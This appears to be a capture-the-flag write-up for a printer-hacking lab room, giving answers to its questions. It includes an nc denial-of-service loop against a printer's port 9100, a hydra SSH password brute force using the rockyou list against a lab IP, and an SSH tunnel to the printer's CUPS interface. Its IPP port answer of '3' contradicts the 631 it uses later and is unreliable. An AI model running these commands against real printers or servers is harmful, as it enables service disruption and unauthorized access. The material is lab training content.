
# Printer Hacking 101

## *Unit 2: IPP Port*

This [Wikipedia](https://en.wikipedia.org/wiki/Internet_Printing_Protocol) page gives
the answer

- What port does IPP run on?

> 3

---

## *Unit 3: Targeting & Exploitation*

- How would a simple printer TCP DoS attack look as a one-line command?

Use this [cheatsheet](http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet)
to read all about different types of attacks. The first one is the answer.

> while true; do nc printer 9100; done

- Review the cheat sheet provided in the task reading above. What attack are printers 
often vulnerable to which involves sending more and more information until a 
pre-allocated buffer size is surpassed?

> buffer overflows

- Connect to the printer per the instructions above. Where's the Fox_Printer located?

First, you'll have to bruteforce the ssh password:

```bash
$ hydra -l printer -P ~/CyberSecurity/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.102.239 ssh -V -t 55
```

Next, use ssh tunneling to access the VM from your browser:

```bash
$ ssh printer@10.10.102.239 -T -L 3631:localhost:631
```

Access http://localhost:3631/printers/ -> Printers

![location](https://i.postimg.cc/5txYk8xD/location.png)

> Skidy's basement

- What is the size of a test sheet?

On that same page, click on the "Fox_Printer" or simply visit the link http://localhost:3631/printers/Fox_Printer

Next, in the 1st dropdown select "Print test page", go to "Jobs" and select
"Show all jobs"

> 1k

